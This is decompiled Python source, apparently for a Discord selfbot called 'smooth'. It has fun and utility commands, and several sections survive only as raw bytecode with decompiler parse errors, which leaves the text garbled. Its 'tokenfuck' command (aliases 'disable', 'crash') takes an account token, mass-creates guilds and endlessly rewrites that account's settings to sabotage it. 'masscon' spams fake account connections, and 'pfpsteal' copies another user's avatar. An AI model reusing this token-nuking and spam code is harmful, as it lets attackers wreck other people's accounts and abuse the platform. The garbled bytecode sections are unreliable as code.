        async def pingweb(ctx, website=None):
            await ctx.message.delete()
            if website is None:
                pass
            else:
                try:
                    r = requests.get(website).status_code
                except Exception as e:
                    try:
                        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                    finally:
                        e = None
                        del e

                else:
                    if r == 404:
                        await ctx.send(f"Site is down, responded with a status code of {r}", delete_after=3)
                    else:
                        await ctx.send(f"Site is up, responded with a status code of {r}", delete_after=3)


        @smooth.command()
        async def tweet(ctx, username: str, *, message: str):
            await ctx.message.delete()
            async with aiohttp.ClientSession() as cs:
                async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
                    res = await r.json()
                    em = discord.Embed()
                    em.set_image(url=(res['message']))
                    await ctx.send(embed=em)


        @smooth.command()
        async def revav(ctx, user: discord.Member=None):
            await ctx.message.delete()
            if user is None:
                user = ctx.author
            try:
                em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
                await ctx.send(embed=em)
            except Exception as e:
                try:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                finally:
                    e = None
                    del e


        @smooth.command(aliases=['pfp', 'avatar'])
        async def av(ctx, *, user: discord.Member=None):
            await ctx.message.delete()
            format = 'gif'
            user = user or ctx.author
            if user.is_avatar_animated() != True:
                format = 'png'
            avatar = user.avatar_url_as(format=(format if format != 'gif' else None))
            async with aiohttp.ClientSession() as session:
                async with session.get(str(avatar)) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=(discord.File(file, f"Avatar.{format}")))


        @smooth.command(aliases=['ri', 'role'])
        async def roleinfo(ctx, *, role: discord.Role):
            await ctx.message.delete()
            guild = ctx.guild
            since_created = (ctx.message.created_at - role.created_at).days
            role_created = role.created_at.strftime('%d %b %Y %H:%M')
            created_on = '{} ({} days ago)'.format(role_created, since_created)
            users = len([x for x in guild.members if role in x.roles])
            if str(role.colour) == '#000000':
                colour = 'default'
                color = '#%06x' % random.randint(0, 16777215)
                color = int(colour[1:], 16)
            else:
                colour = str(role.colour).upper()
                color = role.colour
            em = discord.Embed(colour=color)
            em.set_author(name=f"Name: {role.name}\nRole ID: {role.id}")
            em.add_field(name='Users', value=users)
            em.add_field(name='Mentionable', value=(role.mentionable))
            em.add_field(name='Hoist', value=(role.hoist))
            em.add_field(name='Position', value=(role.position))
            em.add_field(name='Managed', value=(role.managed))
            em.add_field(name='Colour', value=colour)
            em.add_field(name='Creation Date', value=created_on)
            await ctx.send(embed=em)


        @smooth.command()
        async def whois(ctx, *, user: discord.Member=None):
            await ctx.message.delete()
            if user is None:
                user = ctx.author
            date_format = '%a, %d %b %Y %I:%M %p'
            em = discord.Embed(description=(user.mention))
            em.set_author(name=(str(user)), icon_url=(user.avatar_url))
            em.set_thumbnail(url=(user.avatar_url))
            em.add_field(name='Joined', value=(user.joined_at.strftime(date_format)))
            members = sorted((ctx.guild.members), key=(lambda m: m.joined_at))
            em.add_field(name='Join position', value=(str(members.index(user) + 1)))
            em.add_field(name='Registered', value=(user.created_at.strftime(date_format)))
            if len(user.roles) > 1:
                role_string = ' '.join([r.mention for r in user.roles][1:])
                em.add_field(name=('Roles [{}]'.format(len(user.roles) - 1)), value=role_string, inline=False)
            perm_string = ', '.join([str(p[0]).replace('_', ' ').title() for p in user.guild_permissions if p[1]])
            em.add_field(name='Guild permissions', value=perm_string, inline=False)
            em.set_footer(text=('ID: ' + str(user.id)))
            return await ctx.send(embed=em)


        @smooth.command()
        async def minesweeper(ctx, size: int=5):
            await ctx.message.delete()
            size = max(min(size, 8), 2)
            bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
            is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
            has_bomb = lambda x, y: [i for i in bombs if i[0] == x if i[1] == y]
            message = '**Click to play**:\n'
            for y in range(size):
                for x in range(size):
                    tile = '||{}||'.format(chr(11036))
                    if has_bomb(x, y):
                        tile = '||{}||'.format(chr(128163))
                    else:
                        count = 0
                        for xmod, ymod in m_offets:
                            if is_on_board(x + xmod, y + ymod):
                                if has_bomb(x + xmod, y + ymod):
                                    count += 1
                        else:
                            if count != 0:
                                tile = '||{}||'.format(m_numbers[(count - 1)])

                    message += tile
                else:
                    message += '\n'

            else:
                await ctx.send(message)


        @smooth.command()
        async def combine(ctx, name1, name2):
            await ctx.message.delete()
            name1letters = name1[:round(len(name1) / 2)]
            name2letters = name2[round(len(name2) / 2):]
            ship = ''.join([name1letters, name2letters])
            emb = discord.Embed(description=(f"{ship}"))
            emb.set_author(name=f"{name1} + {name2}")
            await ctx.send(embed=emb)


        @smooth.command(name='1337-speak', aliases=['1337speak'])
        async def _1337_speak(ctx, *, text):
            await ctx.message.delete()
            text = text.replace('a', '4').replace('A', '4').replace('e', '3').replace('E', '3').replace('i', '!').replace('I', '!').replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
            await ctx.send(f"`{text}`")


        @smooth.command(aliases=['dvwl'])
        async def devowel(ctx, *, text):
            await ctx.message.delete()
            dvl = text.replace('a', '').replace('A', '').replace('e', '').replace('E', '').replace('i', '').replace('I', '').replace('o', '').replace('O', '').replace('u', '').replace('U', '')
            await ctx.send(dvl)


        @smooth.command()
        async def blank(ctx):
            await ctx.message.delete()
            if config.get('password') == 'password-here':
                print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
            else:
                password = config.get('password')
                with open('Images/Avatars/Transparent.png', 'rb') as f:
                    try:
                        await smooth.user.edit(password=password, username='ٴٴٴٴ', avatar=(f.read()))
                    except discord.HTTPException as e:
                        try:
                            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                        finally:
                            e = None
                            del e


        @smooth.command(aliases=['pfpget', 'stealpfp'])
        async def pfpsteal--- This code section failed: ---

 L.1054         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1055        16  LOAD_GLOBAL              config
               18  LOAD_METHOD              get
               20  LOAD_STR                 'password'
               22  CALL_METHOD_1         1  ''
               24  LOAD_STR                 'password-here'
               26  COMPARE_OP               ==
               28  POP_JUMP_IF_FALSE    62  'to 62'

 L.1056        30  LOAD_GLOBAL              print
               32  LOAD_GLOBAL              Fore
               34  LOAD_ATTR                RED
               36  FORMAT_VALUE          0  ''
               38  LOAD_STR                 '[ERROR] '
               40  LOAD_GLOBAL              Fore
               42  LOAD_ATTR                YELLOW
               44  FORMAT_VALUE          0  ''
               46  LOAD_STR                 'You didnt put your password in the config.json file'
               48  BUILD_STRING_4        4  ''
               50  LOAD_GLOBAL              Fore
               52  LOAD_ATTR                RESET
               54  BINARY_ADD       
               56  CALL_FUNCTION_1       1  ''
               58  POP_TOP          
               60  JUMP_FORWARD        284  'to 284'
             62_0  COME_FROM            28  '28'

 L.1058        62  LOAD_GLOBAL              config
               64  LOAD_METHOD              get
               66  LOAD_STR                 'password'
               68  CALL_METHOD_1         1  ''
               70  STORE_FAST               'password'

 L.1059        72  LOAD_GLOBAL              open
               74  LOAD_STR                 'Images/Avatars/Stolen/Stolen.png'
               76  LOAD_STR                 'wb'
               78  CALL_FUNCTION_2       2  ''
               80  SETUP_WITH          138  'to 138'
               82  STORE_FAST               'f'

 L.1060        84  LOAD_GLOBAL              requests
               86  LOAD_ATTR                get
               88  LOAD_FAST                'user'
               90  LOAD_ATTR                avatar_url
               92  LOAD_CONST               True
               94  LOAD_CONST               ('stream',)
               96  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               98  STORE_FAST               'r'

 L.1061       100  LOAD_FAST                'r'
              102  LOAD_METHOD              iter_content
              104  LOAD_CONST               1024
              106  CALL_METHOD_1         1  ''
              108  GET_ITER         
            110_0  COME_FROM           132  '132'
              110  FOR_ITER            134  'to 134'
              112  STORE_FAST               'block'

 L.1062       114  LOAD_FAST                'block'
              116  POP_JUMP_IF_TRUE    122  'to 122'

 L.1063       118  POP_TOP          
              120  BREAK_LOOP          134  'to 134'
            122_0  COME_FROM           116  '116'

 L.1064       122  LOAD_FAST                'f'
              124  LOAD_METHOD              write
              126  LOAD_FAST                'block'
              128  CALL_METHOD_1         1  ''
              130  POP_TOP          
              132  JUMP_BACK           110  'to 110'
            134_0  COME_FROM           120  '120'
            134_1  COME_FROM           110  '110'
              134  POP_BLOCK        
              136  BEGIN_FINALLY    
            138_0  COME_FROM_WITH       80  '80'
              138  WITH_CLEANUP_START
              140  WITH_CLEANUP_FINISH
              142  END_FINALLY      

 L.1065       144  SETUP_FINALLY       214  'to 214'

 L.1066       146  LOAD_GLOBAL              Image
              148  LOAD_METHOD              open
              150  LOAD_STR                 'Images/Avatars/Stolen/Stolen.png'
              152  CALL_METHOD_1         1  ''
              154  LOAD_METHOD              convert
              156  LOAD_STR                 'RGB'
              158  CALL_METHOD_1         1  ''
              160  POP_TOP          

 L.1067       162  LOAD_GLOBAL              open
              164  LOAD_STR                 'Images/Avatars/Stolen/Stolen.png'
              166  LOAD_STR                 'rb'
              168  CALL_FUNCTION_2       2  ''
              170  SETUP_WITH          204  'to 204'
              172  STORE_FAST               'f'

 L.1068       174  LOAD_GLOBAL              smooth
              176  LOAD_ATTR                user
              178  LOAD_ATTR                edit
              180  LOAD_FAST                'password'
              182  LOAD_FAST                'f'
              184  LOAD_METHOD              read
              186  CALL_METHOD_0         0  ''
              188  LOAD_CONST               ('password', 'avatar')
              190  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              192  GET_AWAITABLE    
              194  LOAD_CONST               None
              196  YIELD_FROM       
              198  POP_TOP          
              200  POP_BLOCK        
              202  BEGIN_FINALLY    
            204_0  COME_FROM_WITH      170  '170'
              204  WITH_CLEANUP_START
              206  WITH_CLEANUP_FINISH
              208  END_FINALLY      
              210  POP_BLOCK        
              212  JUMP_FORWARD        284  'to 284'
            214_0  COME_FROM_FINALLY   144  '144'

 L.1069       214  DUP_TOP          
              216  LOAD_GLOBAL              discord
              218  LOAD_ATTR                HTTPException
              220  COMPARE_OP               exception-match
          222_224  POP_JUMP_IF_FALSE   282  'to 282'
              226  POP_TOP          
              228  STORE_FAST               'e'
              230  POP_TOP          
              232  SETUP_FINALLY       270  'to 270'

 L.1070       234  LOAD_GLOBAL              print
              236  LOAD_GLOBAL              Fore
              238  LOAD_ATTR                RED
              240  FORMAT_VALUE          0  ''
              242  LOAD_STR                 '[ERROR]: '
              244  LOAD_GLOBAL              Fore
              246  LOAD_ATTR                YELLOW
              248  FORMAT_VALUE          0  ''
              250  LOAD_FAST                'e'
              252  FORMAT_VALUE          0  ''
              254  BUILD_STRING_4        4  ''
              256  LOAD_GLOBAL              Fore
              258  LOAD_ATTR                RESET
              260  BINARY_ADD       
              262  CALL_FUNCTION_1       1  ''
              264  POP_TOP          
              266  POP_BLOCK        
              268  BEGIN_FINALLY    
            270_0  COME_FROM_FINALLY   232  '232'
              270  LOAD_CONST               None
              272  STORE_FAST               'e'
              274  DELETE_FAST              'e'
              276  END_FINALLY      
              278  POP_EXCEPT       
              280  JUMP_FORWARD        284  'to 284'
            282_0  COME_FROM           222  '222'
              282  END_FINALLY      
            284_0  COME_FROM           280  '280'
            284_1  COME_FROM           212  '212'
            284_2  COME_FROM            60  '60'

Parse error at or near `BEGIN_FINALLY' instruction at offset 136


        @smooth.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
        async def _set_pfp--- This code section failed: ---

 L.1074         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1075        16  LOAD_GLOBAL              config
               18  LOAD_METHOD              get
               20  LOAD_STR                 'password'
               22  CALL_METHOD_1         1  ''
               24  LOAD_STR                 'password-here'
               26  COMPARE_OP               ==
               28  POP_JUMP_IF_FALSE    62  'to 62'

 L.1076        30  LOAD_GLOBAL              print
               32  LOAD_GLOBAL              Fore
               34  LOAD_ATTR                RED
               36  FORMAT_VALUE          0  ''
               38  LOAD_STR                 '[ERROR] '
               40  LOAD_GLOBAL              Fore
               42  LOAD_ATTR                YELLOW
               44  FORMAT_VALUE          0  ''
               46  LOAD_STR                 'You didnt put your password in the config.json file'
               48  BUILD_STRING_4        4  ''
               50  LOAD_GLOBAL              Fore
               52  LOAD_ATTR                RESET
               54  BINARY_ADD       
               56  CALL_FUNCTION_1       1  ''
               58  POP_TOP          
               60  JUMP_FORWARD        142  'to 142'
             62_0  COME_FROM            28  '28'

 L.1078        62  LOAD_GLOBAL              config
               64  LOAD_METHOD              get
               66  LOAD_STR                 'password'
               68  CALL_METHOD_1         1  ''
               70  STORE_FAST               'password'

 L.1079        72  LOAD_GLOBAL              open
               74  LOAD_STR                 'Images/Avatars/PFP-1.png'
               76  LOAD_STR                 'wb'
               78  CALL_FUNCTION_2       2  ''
               80  SETUP_WITH          136  'to 136'
               82  STORE_FAST               'f'

 L.1080        84  LOAD_GLOBAL              requests
               86  LOAD_ATTR                get
               88  LOAD_FAST                'url'
               90  LOAD_CONST               True
               92  LOAD_CONST               ('stream',)
               94  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               96  STORE_FAST               'r'

 L.1081        98  LOAD_FAST                'r'
              100  LOAD_METHOD              iter_content
              102  LOAD_CONST               1024
              104  CALL_METHOD_1         1  ''
              106  GET_ITER         
            108_0  COME_FROM           130  '130'
              108  FOR_ITER            132  'to 132'
              110  STORE_FAST               'block'

 L.1082       112  LOAD_FAST                'block'
              114  POP_JUMP_IF_TRUE    120  'to 120'

 L.1083       116  POP_TOP          
              118  BREAK_LOOP          132  'to 132'
            120_0  COME_FROM           114  '114'

 L.1084       120  LOAD_FAST                'f'
              122  LOAD_METHOD              write
              124  LOAD_FAST                'block'
              126  CALL_METHOD_1         1  ''
              128  POP_TOP          
              130  JUMP_BACK           108  'to 108'
            132_0  COME_FROM           118  '118'
            132_1  COME_FROM           108  '108'
              132  POP_BLOCK        
              134  BEGIN_FINALLY    
            136_0  COME_FROM_WITH       80  '80'
              136  WITH_CLEANUP_START
              138  WITH_CLEANUP_FINISH
              140  END_FINALLY      
            142_0  COME_FROM            60  '60'

 L.1085       142  SETUP_FINALLY       212  'to 212'

 L.1086       144  LOAD_GLOBAL              Image
              146  LOAD_METHOD              open
              148  LOAD_STR                 'Images/Avatars/PFP-1.png'
              150  CALL_METHOD_1         1  ''
              152  LOAD_METHOD              convert
              154  LOAD_STR                 'RGB'
              156  CALL_METHOD_1         1  ''
              158  POP_TOP          

 L.1087       160  LOAD_GLOBAL              open
              162  LOAD_STR                 'Images/Avatars/PFP-1.png'
              164  LOAD_STR                 'rb'
              166  CALL_FUNCTION_2       2  ''
              168  SETUP_WITH          202  'to 202'
              170  STORE_FAST               'f'

 L.1088       172  LOAD_GLOBAL              smooth
              174  LOAD_ATTR                user
              176  LOAD_ATTR                edit
              178  LOAD_FAST                'password'
              180  LOAD_FAST                'f'
              182  LOAD_METHOD              read
              184  CALL_METHOD_0         0  ''
              186  LOAD_CONST               ('password', 'avatar')
              188  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              190  GET_AWAITABLE    
              192  LOAD_CONST               None
              194  YIELD_FROM       
              196  POP_TOP          
              198  POP_BLOCK        
              200  BEGIN_FINALLY    
            202_0  COME_FROM_WITH      168  '168'
              202  WITH_CLEANUP_START
              204  WITH_CLEANUP_FINISH
              206  END_FINALLY      
              208  POP_BLOCK        
              210  JUMP_FORWARD        282  'to 282'
            212_0  COME_FROM_FINALLY   142  '142'

 L.1089       212  DUP_TOP          
              214  LOAD_GLOBAL              discord
              216  LOAD_ATTR                HTTPException
              218  COMPARE_OP               exception-match
          220_222  POP_JUMP_IF_FALSE   280  'to 280'
              224  POP_TOP          
              226  STORE_FAST               'e'
              228  POP_TOP          
              230  SETUP_FINALLY       268  'to 268'

 L.1090       232  LOAD_GLOBAL              print
              234  LOAD_GLOBAL              Fore
              236  LOAD_ATTR                RED
              238  FORMAT_VALUE          0  ''
              240  LOAD_STR                 '[ERROR]: '
              242  LOAD_GLOBAL              Fore
              244  LOAD_ATTR                YELLOW
              246  FORMAT_VALUE          0  ''
              248  LOAD_FAST                'e'
              250  FORMAT_VALUE          0  ''
              252  BUILD_STRING_4        4  ''
              254  LOAD_GLOBAL              Fore
              256  LOAD_ATTR                RESET
              258  BINARY_ADD       
              260  CALL_FUNCTION_1       1  ''
              262  POP_TOP          
              264  POP_BLOCK        
              266  BEGIN_FINALLY    
            268_0  COME_FROM_FINALLY   230  '230'
              268  LOAD_CONST               None
              270  STORE_FAST               'e'
              272  DELETE_FAST              'e'
              274  END_FINALLY      
              276  POP_EXCEPT       
              278  JUMP_FORWARD        282  'to 282'
            280_0  COME_FROM           220  '220'
              280  END_FINALLY      
            282_0  COME_FROM           278  '278'
            282_1  COME_FROM           210  '210'

Parse error at or near `BEGIN_FINALLY' instruction at offset 134


        @smooth.command(aliases=['dong', 'penis'])
        async def dick(ctx, *, user: discord.Member=None):
            await ctx.message.delete()
            if user is None:
                user = ctx.author
            size = random.randint(1, 15)
            dong = ''
            for _i in range(0, size):
                dong += '='
            else:
                em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0)
                await ctx.send(embed=em)


        @smooth.command(aliases=['changehypesquad'])
        async def hypesquad(ctx, house):
            await ctx.message.delete()
            request = requests.Session()
            headers = {'Authorization':token, 
             'Content-Type':'application/json', 
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            if house == 'bravery':
                payload = {'house_id': 1}
            elif house == 'brilliance':
                payload = {'house_id': 2}
            elif house == 'balance':
                payload = {'house_id': 3}
            elif house == 'random':
                houses = [
                 1, 2, 3]
                payload = {'house_id': random.choice(houses)}
            try:
                request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
            except Exception as e:
                try:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                finally:
                    e = None
                    del e


        @smooth.command(aliases=['tokenfucker', 'disable', 'crash'])
        async def tokenfuck--- This code section failed: ---

 L.1129         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1131        16  LOAD_STR                 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7'

 L.1132        18  LOAD_STR                 'application/json'

 L.1133        20  LOAD_FAST                '_token'

 L.1130        22  LOAD_CONST               ('User-Agent', 'Content-Type', 'Authorization')
               24  BUILD_CONST_KEY_MAP_3     3 
               26  STORE_FAST               'headers'

 L.1135        28  LOAD_GLOBAL              requests
               30  LOAD_METHOD              Session
               32  CALL_METHOD_0         0  ''
               34  STORE_FAST               'request'

 L.1137        36  LOAD_STR                 'light'

 L.1138        38  LOAD_STR                 'ja'

 L.1139        40  LOAD_CONST               False

 L.1140        42  LOAD_CONST               False

 L.1141        44  LOAD_CONST               False

 L.1142        46  LOAD_CONST               False

 L.1143        48  LOAD_CONST               False

 L.1144        50  LOAD_CONST               False

 L.1145        52  LOAD_CONST               False

 L.1146        54  LOAD_CONST               False

 L.1147        56  LOAD_CONST               False

 L.1148        58  LOAD_STR                 '0'

 L.1149        60  LOAD_STR                 'invisible'

 L.1136        62  LOAD_CONST               ('theme', 'locale', 'message_display_compact', 'inline_embed_media', 'inline_attachment_media', 'gif_auto_play', 'render_embeds', 'render_reactions', 'animate_emoji', 'convert_emoticons', 'enable_tts_command', 'explicit_content_filter', 'status')
               64  BUILD_CONST_KEY_MAP_13    13 
               66  STORE_FAST               'payload'

 L.1152        68  LOAD_CONST               None

 L.1153        70  LOAD_CONST               None

 L.1154        72  LOAD_STR                 'smooth'

 L.1155        74  LOAD_STR                 'europe'

 L.1151        76  LOAD_CONST               ('channels', 'icon', 'name', 'region')
               78  BUILD_CONST_KEY_MAP_4     4 
               80  STORE_FAST               'guild'

 L.1157        82  LOAD_GLOBAL              range
               84  LOAD_CONST               50
               86  CALL_FUNCTION_1       1  ''
               88  GET_ITER         
             90_0  COME_FROM           110  '110'
               90  FOR_ITER            112  'to 112'
               92  STORE_FAST               '_i'

 L.1158        94  LOAD_GLOBAL              requests
               96  LOAD_ATTR                post
               98  LOAD_STR                 'https://discordapp.com/api/v6/guilds'
              100  LOAD_FAST                'headers'
              102  LOAD_FAST                'guild'
              104  LOAD_CONST               ('headers', 'json')
              106  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              108  POP_TOP          
              110  JUMP_BACK            90  'to 90'
            112_0  COME_FROM           202  '202'
            112_1  COME_FROM           196  '196'
            112_2  COME_FROM            90  '90'

 L.1160       112  SETUP_FINALLY       134  'to 134'

 L.1161       114  LOAD_FAST                'request'
              116  LOAD_ATTR                patch
              118  LOAD_STR                 'https://canary.discordapp.com/api/v6/users/@me/settings'
              120  LOAD_FAST                'headers'
              122  LOAD_FAST                'payload'
              124  LOAD_CONST               ('headers', 'json')
              126  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              128  POP_TOP          
              130  POP_BLOCK        
              132  JUMP_FORWARD        204  'to 204'
            134_0  COME_FROM_FINALLY   112  '112'

 L.1162       134  DUP_TOP          
              136  LOAD_GLOBAL              Exception
              138  COMPARE_OP               exception-match
              140  POP_JUMP_IF_FALSE   198  'to 198'
              142  POP_TOP          
              144  STORE_FAST               'e'
              146  POP_TOP          
              148  SETUP_FINALLY       186  'to 186'

 L.1163       150  LOAD_GLOBAL              print
              152  LOAD_GLOBAL              Fore
              154  LOAD_ATTR                RED
              156  FORMAT_VALUE          0  ''
              158  LOAD_STR                 '[ERROR]: '
              160  LOAD_GLOBAL              Fore
              162  LOAD_ATTR                YELLOW
              164  FORMAT_VALUE          0  ''
              166  LOAD_FAST                'e'
              168  FORMAT_VALUE          0  ''
              170  BUILD_STRING_4        4  ''
              172  LOAD_GLOBAL              Fore
              174  LOAD_ATTR                RESET
              176  BINARY_ADD       
              178  CALL_FUNCTION_1       1  ''
              180  POP_TOP          
              182  POP_BLOCK        
              184  BEGIN_FINALLY    
            186_0  COME_FROM_FINALLY   148  '148'
              186  LOAD_CONST               None
              188  STORE_FAST               'e'
              190  DELETE_FAST              'e'
              192  END_FINALLY      
              194  POP_EXCEPT       
              196  JUMP_BACK           112  'to 112'
            198_0  COME_FROM           140  '140'
              198  END_FINALLY      

 L.1165       200  JUMP_FORWARD        204  'to 204'
              202  JUMP_BACK           112  'to 112'
            204_0  COME_FROM           200  '200'
            204_1  COME_FROM           132  '132'

 L.1166       204  LOAD_GLOBAL              cycle
              206  LOAD_STR                 'light'
              208  LOAD_STR                 'dark'
              210  BUILD_LIST_2          2 
              212  CALL_FUNCTION_1       1  ''
              214  STORE_FAST               'modes'

 L.1167       216  LOAD_GLOBAL              cycle
              218  LOAD_STR                 'online'
              220  LOAD_STR                 'idle'
              222  LOAD_STR                 'dnd'
              224  LOAD_STR                 'invisible'
              226  BUILD_LIST_4          4 
              228  CALL_FUNCTION_1       1  ''
              230  STORE_FAST               'statuses'
            232_0  COME_FROM           356  '356'
            232_1  COME_FROM           350  '350'

 L.1170       232  LOAD_GLOBAL              next
              234  LOAD_FAST                'modes'
              236  CALL_FUNCTION_1       1  ''

 L.1171       238  LOAD_GLOBAL              random
              240  LOAD_METHOD              choice
              242  LOAD_GLOBAL              locales
              244  CALL_METHOD_1         1  ''

 L.1172       246  LOAD_GLOBAL              next
              248  LOAD_FAST                'statuses'
              250  CALL_FUNCTION_1       1  ''

 L.1169       252  LOAD_CONST               ('theme', 'locale', 'status')
              254  BUILD_CONST_KEY_MAP_3     3 
              256  STORE_FAST               'setting'
            258_0  COME_FROM           352  '352'
            258_1  COME_FROM           346  '346'

 L.1175       258  SETUP_FINALLY       282  'to 282'

 L.1176       260  LOAD_FAST                'request'
              262  LOAD_ATTR                patch
              264  LOAD_STR                 'https://canary.discordapp.com/api/v6/users/@me/settings'
              266  LOAD_FAST                'headers'
              268  LOAD_FAST                'setting'
              270  LOAD_CONST               10
              272  LOAD_CONST               ('headers', 'json', 'timeout')
              274  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
              276  POP_TOP          
              278  POP_BLOCK        
              280  JUMP_FORWARD        350  'to 350'
            282_0  COME_FROM_FINALLY   258  '258'

 L.1177       282  DUP_TOP          
              284  LOAD_GLOBAL              Exception
              286  COMPARE_OP               exception-match
          288_290  POP_JUMP_IF_FALSE   348  'to 348'
              292  POP_TOP          
              294  STORE_FAST               'e'
              296  POP_TOP          
              298  SETUP_FINALLY       336  'to 336'

 L.1178       300  LOAD_GLOBAL              print
              302  LOAD_GLOBAL              Fore
              304  LOAD_ATTR                RED
              306  FORMAT_VALUE          0  ''
              308  LOAD_STR                 '[ERROR]: '
              310  LOAD_GLOBAL              Fore
              312  LOAD_ATTR                YELLOW
              314  FORMAT_VALUE          0  ''
              316  LOAD_FAST                'e'
              318  FORMAT_VALUE          0  ''
              320  BUILD_STRING_4        4  ''
              322  LOAD_GLOBAL              Fore
              324  LOAD_ATTR                RESET
              326  BINARY_ADD       
              328  CALL_FUNCTION_1       1  ''
              330  POP_TOP          
              332  POP_BLOCK        
              334  BEGIN_FINALLY    
            336_0  COME_FROM_FINALLY   298  '298'
              336  LOAD_CONST               None
              338  STORE_FAST               'e'
              340  DELETE_FAST              'e'
              342  END_FINALLY      
              344  POP_EXCEPT       
              346  JUMP_BACK           258  'to 258'
            348_0  COME_FROM           288  '288'
              348  END_FINALLY      
            350_0  COME_FROM           280  '280'

 L.1180       350  CONTINUE            232  'to 232'
          352_354  JUMP_BACK           258  'to 258'
              356  JUMP_BACK           232  'to 232'

Parse error at or near `JUMP_FORWARD' instruction at offset 200


        @smooth.command()
        async def masslogin(ctx, choice=None):
            await ctx.message.delete()
            _masslogin(choice)


        @smooth.command()
        async def masscon--- This code section failed: ---

 L.1189         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1191        16  LOAD_FAST                'name'

 L.1192        18  LOAD_CONST               1

 L.1190        20  LOAD_CONST               ('name', 'visibility')
               22  BUILD_CONST_KEY_MAP_2     2 
               24  STORE_FAST               'payload'

 L.1195        26  LOAD_GLOBAL              token

 L.1196        28  LOAD_STR                 'application/json'

 L.1194        30  LOAD_CONST               ('Authorization', 'Content-Type')
               32  BUILD_CONST_KEY_MAP_2     2 
               34  STORE_FAST               'headers'

 L.1199        36  LOAD_STR                 'battlenet'

 L.1200        38  LOAD_STR                 'skype'

 L.1201        40  LOAD_STR                 'leagueoflegends'

 L.1198        42  BUILD_LIST_3          3 
               44  STORE_FAST               'avaliable'

 L.1203        46  LOAD_FAST                'name'
               48  LOAD_CONST               None
               50  COMPARE_OP               is
               52  POP_JUMP_IF_FALSE    60  'to 60'

 L.1204        54  LOAD_STR                 'about:blank'
               56  STORE_FAST               'name'
               58  JUMP_FORWARD         82  'to 82'
             60_0  COME_FROM            52  '52'

 L.1205        60  LOAD_FAST                '_type'
               62  LOAD_FAST                'avaliable'
               64  COMPARE_OP               not-in
               66  POP_JUMP_IF_FALSE    82  'to 82'

 L.1206        68  LOAD_GLOBAL              print
               70  LOAD_STR                 'Avaliable connections: '
               72  LOAD_FAST                'avaliable'
               74  FORMAT_VALUE          0  ''
               76  BUILD_STRING_2        2  ''
               78  CALL_FUNCTION_1       1  ''
               80  POP_TOP          
             82_0  COME_FROM            66  '66'
             82_1  COME_FROM            58  '58'

 L.1207        82  LOAD_GLOBAL              range
               84  LOAD_FAST                'amount'
               86  CALL_FUNCTION_1       1  ''
               88  GET_ITER         
             90_0  COME_FROM           288  '288'
             90_1  COME_FROM           284  '284'
             90_2  COME_FROM           226  '226'
               90  FOR_ITER            290  'to 290'
               92  STORE_FAST               '_i'

 L.1208        94  SETUP_FINALLY       228  'to 228'

 L.1209        96  LOAD_GLOBAL              random
               98  LOAD_METHOD              randint
              100  LOAD_CONST               10000000
              102  LOAD_CONST               90000000
              104  CALL_METHOD_2         2  ''
              106  STORE_FAST               'ID'

 L.1210       108  LOAD_GLOBAL              time
              110  LOAD_METHOD              sleep
              112  LOAD_CONST               5
              114  CALL_METHOD_1         1  ''
              116  POP_TOP          

 L.1211       118  LOAD_GLOBAL              requests
              120  LOAD_ATTR                put
              122  LOAD_STR                 'https://canary.discordapp.com/api/v6/users/@me/connections/'
              124  LOAD_FAST                '_type'
              126  FORMAT_VALUE          0  ''
              128  LOAD_STR                 '/'
              130  LOAD_FAST                'ID'
              132  FORMAT_VALUE          0  ''
              134  BUILD_STRING_4        4  ''
              136  LOAD_GLOBAL              json
              138  LOAD_METHOD              dumps
              140  LOAD_FAST                'payload'
              142  CALL_METHOD_1         1  ''
              144  LOAD_FAST                'headers'
              146  LOAD_CONST               ('data', 'headers')
              148  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              150  STORE_FAST               'r'

 L.1212       152  LOAD_FAST                'r'
              154  LOAD_ATTR                status_code
              156  LOAD_CONST               200
              158  COMPARE_OP               ==
